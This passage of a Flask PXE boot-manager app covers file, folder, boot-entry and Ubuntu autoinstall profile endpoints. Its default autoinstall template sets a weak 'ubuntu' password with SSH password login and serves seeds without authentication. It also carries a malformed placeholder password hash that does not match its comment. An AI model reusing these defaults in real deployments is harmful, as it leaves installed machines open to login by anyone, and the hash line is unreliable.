    if not name or '/' in name:
        return jsonify({'error': 'Invalid folder name'}), 400
    rel = f'{parent}/{name}' if parent else name
    target = UPLOAD_DIR / rel
    if not _within_share(target):
        return jsonify({'error': 'Invalid path'}), 400
    if target.exists():
        return jsonify({'error': 'Already exists'}), 409
    try:
        target.mkdir(parents=True, exist_ok=False)
    except FileExistsError:
        return jsonify({'error': 'Already exists'}), 409
    return jsonify({'ok': True, 'path': rel}), 201


@app.route('/api/folders/<path:folder>', methods=['DELETE'])
def api_delete_folder(folder):
    """Delete a share folder. Empty-only by default; ?recursive=1 forces a
    recursive delete and then prunes any now-dangling boot entries."""
    rel = _safe_relpath(folder)
    if not rel:
        return jsonify({'error': 'Invalid path'}), 400
    target = UPLOAD_DIR / rel
    if not _within_share(target) or not target.is_dir():
        return jsonify({'error': 'Not found'}), 404
    recursive = request.args.get('recursive', '') in ('1', 'true', 'yes')
    if any(target.iterdir()) and not recursive:
        return jsonify({'error': 'Folder is not empty'}), 409
    try:
        if recursive:
            shutil.rmtree(target)
        else:
            target.rmdir()
    except OSError as exc:
        return jsonify({'error': f'Delete failed: {exc}'}), 500
    _prune_dangling_entries()
    return jsonify({'ok': True})


@app.route('/api/files/move', methods=['POST'])
def api_move():
    """Move or rename a file or folder within the share. Body: {src, dst}.
    Never overwrites; rewrites boot-entry paths so auto-created entries stay
    valid across a rename. Does NOT re-apply the upload whitelist — src was
    admitted once already (or written by ISO extraction)."""
    d = request.get_json(silent=True) or {}
    src = _safe_relpath(d.get('src', '') or '')
    dst = _safe_relpath(d.get('dst', '') or '')
    if not src or not dst:
        return jsonify({'error': 'src and dst are required'}), 400
    if src == dst:
        return jsonify({'error': 'src and dst are the same'}), 400
    sp, dp = UPLOAD_DIR / src, UPLOAD_DIR / dst
    if not _within_share(sp) or not _within_share(dp):
        return jsonify({'error': 'Invalid path'}), 400
    if not sp.exists():
        return jsonify({'error': 'Source not found'}), 404
    # refuse to move a folder into its own subtree (would recurse/vanish)
    if sp.is_dir() and (dst == src or dst.startswith(src + '/')):
        return jsonify({'error': 'Cannot move a folder into itself'}), 400
    if dp.exists():
        return jsonify({'error': 'Destination already exists'}), 409
    try:
        dp.parent.mkdir(parents=True, exist_ok=True)
        sp.rename(dp)
    except OSError as exc:
        return jsonify({'error': f'Move failed: {exc}'}), 500
    _rewrite_entry_paths(src, dst)
    return jsonify({'ok': True, 'from': src, 'to': dst})


@app.route('/api/files/<path:filename>', methods=['DELETE'])
def api_delete_file(filename):
    rel = _safe_relpath(filename)
    if not rel:
        return jsonify({'error': 'Invalid path'}), 400
    path = UPLOAD_DIR / rel
    if path.exists() and path.is_file():
        path.unlink()
        prune = [path.parent]
        # deleting an ISO also removes the boot files extracted from it
        # (works at any level: 'x.iso' -> 'x/', 'monitor/x.iso' -> 'monitor/x/')
        if rel.lower().endswith('.iso'):
            folder = path.parent / pathlib.Path(rel).stem
            if folder.is_dir():
                for f in folder.iterdir():
                    base = f.name.lower()
                    if f.is_file() and (_KERNEL_NAME.match(base)
                                        or _INITRD_NAME.match(base)):
                        f.unlink()
                prune.insert(0, folder)   # innermost first
        # drop now-empty folders, but never UPLOAD_DIR itself
        for d in prune:
            if d != UPLOAD_DIR and d.is_dir() and not any(d.iterdir()):
                d.rmdir()
        return jsonify({'ok': True})
    return jsonify({'error': 'Not found'}), 404

# boot entries

@app.route('/api/entries', methods=['GET'])
def api_get_entries():
    return jsonify(load_entries())

@app.route('/api/entries', methods=['POST'])
def api_add_entry():
    fields, err = sanitize_fields(request.get_json(force=True) or {})
    if err:
        return jsonify({'error': err}), 400
    if not fields.get('name'):
        return jsonify({'error': 'name is required'}), 400
    # ids double as iPXE goto labels; leading letter keeps them unambiguous
    entry = {'id': 'e' + uuid.uuid4().hex[:7], 'type': 'kernel', 'enabled': True}
    entry.update(fields)
    with entries_lock():
        entries = load_entries()
        entries.append(entry)
        save_entries(entries)
    return jsonify(entry), 201

@app.route('/api/entries/<eid>', methods=['PUT'])
def api_update_entry(eid):
    fields, err = sanitize_fields(request.get_json(force=True) or {})
    if err:
        return jsonify({'error': err}), 400
    with entries_lock():
        entries = load_entries()
        for i, e in enumerate(entries):
            if e['id'] == eid:
                entries[i] = {**e, **fields, 'id': eid}
                save_entries(entries)
                return jsonify(entries[i])
    return jsonify({'error': 'Not found'}), 404

@app.route('/api/entries/<eid>', methods=['DELETE'])
def api_delete_entry(eid):
    with entries_lock():
        save_entries([e for e in load_entries() if e['id'] != eid])
    return jsonify({'ok': True})

# ── autoinstall (cloud-init NoCloud) profiles ─────────────────────────────────

DEFAULT_AUTOINSTALL = """\
#cloud-config
# ─────────────────────────────────────────────────────────────────────────────
# Ubuntu Server autoinstall (subiquity). Served to the installer over HTTP as a
# cloud-init NoCloud seed. ⚠️  THIS PERFORMS AN UNATTENDED INSTALL AND WILL ERASE
# THE TARGET DISK. Review every value before enabling the boot entry.
#
# Pair with a "Kernel + initrd" boot entry whose command line points at the
# matching live-server ISO, e.g.:
#   ip=dhcp url=http://SERVER:8080/files/ubuntu-24.04.1-live-server-amd64.iso
# then attach this profile to that entry (the seed URL is added automatically).
# ─────────────────────────────────────────────────────────────────────────────
autoinstall:
  version: 1
  locale: en_US.UTF-8
  keyboard:
    layout: us
  identity:
    hostname: ubuntu-lab
    username: ubuntu
    # Password is 'ubuntu' — CHANGE THIS. Generate with:  mkpasswd -m sha-512
    password: "$6$rounds=4096$aReallyBadSalt$Vp8m0Xb3W4o8gk0m1kQ2sT0p9c5r7uY0"
  ssh:
    install-server: true
    allow-pw: true
  storage:
    layout:
      name: direct        # use the whole disk; wipes existing data
  packages:
    - openssh-server
  user-data:
    disable_root: true
  late-commands: []
"""


def _validate_user_data(text):
    """Return an error string if the user-data is unusable, else None."""
    if not text.strip():
        return 'user-data must not be empty'
    if yaml is not None:
        body = text
        if body.lstrip().startswith('#cloud-config'):
            body = body.split('\n', 1)[1] if '\n' in body else ''
        try:
            doc = yaml.safe_load(body) if body.strip() else None
        except yaml.YAMLError as exc:
            return f'user-data is not valid YAML: {exc}'
        if doc is not None and not isinstance(doc, dict):
            return 'user-data must be a YAML mapping (e.g. an autoinstall: block)'
    return None


@app.route('/api/autoinstall', methods=['GET'])
def api_list_profiles():
    profiles = load_profiles()
    listed = [{'id': p['id'], 'name': p.get('name', ''),
               'hostname': p.get('hostname', ''),
               'seed_url': f'{MANAGER_BASE}/autoinstall/{p["id"]}/'}
              for p in profiles]
    return jsonify({'profiles': listed, 'template': DEFAULT_AUTOINSTALL,
                    'manager_base': MANAGER_BASE})


@app.route('/api/autoinstall/<pid>', methods=['GET'])
def api_get_profile(pid):
    for p in load_profiles():
        if p['id'] == pid:
            return jsonify({**p, 'seed_url': f'{MANAGER_BASE}/autoinstall/{pid}/'})
    return jsonify({'error': 'Not found'}), 404


@app.route('/api/autoinstall', methods=['POST'])
def api_save_profile():
    data = request.get_json(force=True) or {}
    name = _clean(data.get('name', ''))
    if not name:
        return jsonify({'error': 'name is required'}), 400
    user_data = str(data.get('user_data', ''))
    err = _validate_user_data(user_data)
    if err:
        return jsonify({'error': err}), 400
    hostname = _clean(data.get('hostname', '') or '', 63)
    pid = data.get('id') or ''
    with entries_lock():
        profiles = load_profiles()
        if pid:
            found = next((p for p in profiles if p['id'] == pid), None)
            if not found:
                return jsonify({'error': 'Not found'}), 404
            found.update({'name': name, 'hostname': hostname, 'user_data': user_data})
        else:
            pid = 'a' + uuid.uuid4().hex[:7]
            profiles.append({'id': pid, 'name': name, 'hostname': hostname,
                             'user_data': user_data})
        save_profiles(profiles)
    return jsonify({'id': pid, 'seed_url': f'{MANAGER_BASE}/autoinstall/{pid}/'}), 201


@app.route('/api/autoinstall/<pid>', methods=['DELETE'])
def api_delete_profile(pid):
    with entries_lock():
        save_profiles([p for p in load_profiles() if p['id'] != pid])
    return jsonify({'ok': True})


def _profile_or_404(pid):
    for p in load_profiles():
        if p['id'] == pid:
            return p
    return None


# PXE-facing seed endpoints (no auth — the installer has no credentials).
@app.route('/autoinstall/<pid>/user-data')
def serve_user_data(pid):
    p = _profile_or_404(pid)
    if not p:
        return Response('# unknown autoinstall profile\n', 404, mimetype='text/plain')
    return Response(p.get('user_data', ''), mimetype='text/plain')


@app.route('/autoinstall/<pid>/meta-data')
def serve_meta_data(pid):
    p = _profile_or_404(pid)
    if not p:
        return Response('', 404, mimetype='text/plain')
    hostname = p.get('hostname') or 'ubuntu-lab'
    return Response(f'instance-id: iid-{pid}\nlocal-hostname: {hostname}\n',
                    mimetype='text/plain')


@app.route('/autoinstall/<pid>/vendor-data')
def serve_vendor_data(pid):
    # cloud-init requests vendor-data; an empty 200 keeps it quiet
    return Response('', mimetype='text/plain')


@app.errorhandler(413)
def _entry_too_large(_e):
    limit = app.config['MAX_CONTENT_LENGTH'] // (1024 * 1024 * 1024)
    return jsonify({'error': f'file exceeds the {limit} GB upload limit'}), 413


@app.route('/api/entries/reorder', methods=['POST'])
def api_reorder():
    order = (request.get_json(force=True) or {}).get('order', [])
    with entries_lock():
        entries = load_entries()
        by_id = {e['id']: e for e in entries}
        reordered = [by_id[eid] for eid in order if eid in by_id]
        # entries the client didn't know about (added concurrently) must survive
        listed = set(order)
        reordered += [e for e in entries if e['id'] not in listed]
        save_entries(reordered)
    return jsonify({'ok': True})

if __name__ == '__main__':
    # Dev/local convenience only — the container runs gunicorn as its CMD.
    # gthread: heartbeat stays in the main thread, so multi-GB uploads in
    # worker threads are not killed by the arbiter timeout (sync workers are).
    os.execvp('gunicorn', [
        'gunicorn', '-w', '2', '-k', 'gthread', '--threads', '8',
        '--timeout', '120', '-b', '0.0.0.0:8091', 'app:app',
    ])
